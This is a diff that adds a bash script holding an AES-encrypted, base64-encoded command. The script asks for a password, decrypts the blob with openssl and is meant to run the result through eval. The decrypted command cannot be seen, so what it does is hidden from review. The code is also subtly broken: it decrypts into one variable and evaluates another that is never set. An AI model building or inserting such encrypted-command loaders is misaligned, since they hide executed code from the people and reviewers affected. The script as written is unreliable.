@@ -1,0 +1,15 @@
+#!/bin/bash
+da="U2FsdGVkX1/0FskwGBFGYwLKuuUK4d3JcF+ZkbR7iLCJxDrHHqa4AxMx/O42nXCz
+SIgyL+lCbnoFsMP2GQufIOsqI3VedAj/nNqB/SybJuZznpza5N87Oa7OdgvZf69T
+r47rpoYejkJuUumi5w0bywDqayYk/OfKMdM9TeuqQpyq6rf6c3wJDYMAIA2rQdFN
+3BM3fSmd/u8/VQVdfbHDng=="
+read -sp "Enter Password to execute: " PASSWORD
+echo ""
+de=$(echo "$da" | openssl enc -aes-256-cbc -a -d -pbkdf2 -pass pass:"$PASSWORD" 2>/dev/null)
+if [ $? -eq 0 ] && [ ! -z "$de" ]; then
+    echo "Success! Executing command..."
+    eval "$DECODED_COMMAND"
+else
+    echo "Error: Wrong password or corrupted data."
+    exit 1
+fi
